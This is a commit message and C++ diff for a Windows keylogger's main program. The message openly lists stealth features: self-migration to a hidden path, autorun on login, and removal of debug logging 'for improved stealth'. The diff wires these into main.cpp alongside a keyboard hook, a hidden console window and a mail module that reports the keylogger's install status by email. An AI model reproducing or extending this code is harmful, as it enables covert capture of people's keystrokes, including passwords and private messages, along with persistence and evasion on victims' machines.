Added new features and a program to decrypt generated logs.
The program can now automatically migrate itself to a hidden path.
The program can now set itself to run on login.
Removed some TODO's that were fixed.
Removed calls to IO::WriteDebugAppLog for improved stealth.
Settings.cpp: Cleaned up getter declerations.
In IO.cpp: rewrote WriteLog function.
Added a file with list of desired features.

+++ main.cpp
@@ -1,31 +1,63 @@
 #include <windows.h>
 #include <fstream>
+#include <chrono>
+#include "include/mingw.thread.h"
 #include "src/KeyboardHook.h"
 #include "src/IO.h"
+#include "src/AutoStart.h"
 #include "src/Settings.h"
+#include "src/SafeMigrate.h"
+#include "src/MailSender.h"
 
 
 int main()
 {
+
     bool ok = Settings::InitSettings();
     if (!ok)
         return 0;
 
-    IO::MakeOneDirectory(IO::GetTargetLogsDirPath(false));
-    IO::WriteToLog("Starting program...");
-
-    ok = KeyboardHook::InstallHook(); 
-    
-    if (!ok)
-        IO::WriteDebugAppLog("Could not install keyboardhook, exiting...");
-    
-    //this hides the console window
-    MSG msg;
-    while(GetMessage(&msg, NULL, 0, 0))
-    {   
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+    if (Settings::get_autoSafeMigrate() && !ExeMigration::CheckIfSafe())
+    {
+            if (!ExeMigration::MigrateToSafeDir())
+            {
+                Mail::SendMail("Did not install keylogger", "The keylogger was unable to migrate to a safe directory and exited.\n", "", true);
+                return 1;
+            }
     }
-    KeyboardHook::UninstallHook();
+    
+    else
+    {
+        ExeMigration::DeleteMigrationScript();
+
+        if (Settings::get_autoStartProgram())
+        {
+            if (!AutoStart::setAutoRun("Program", IO::GetThisFilePath()))
+            {
+                Mail::SendMail("Problems installing keylogger", "The keylogger failed to enable autorun.\nCan't enable autorun. \nUsed filepath: " + 
+                IO::GetThisFilePath() + "The program will continue running until the PC is shut down.", "", true);
+            }
+        }
+
+        ok = KeyboardHook::InstallHook();
+        if (!ok)
+        {
+            Mail::SendMail("Failed to install keylogger", "The keylogger failed to install a keyboardhook and exited.\n", "", true);
+            return 2;
+        }
+        else
+        {
+            //this hides the console window
+            MSG msg;
+            while (GetMessage(&msg, NULL, 0, 0))
+            {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+            }
+        }
+
+        KeyboardHook::UninstallHook();
+    }
     return 0;
 }
+
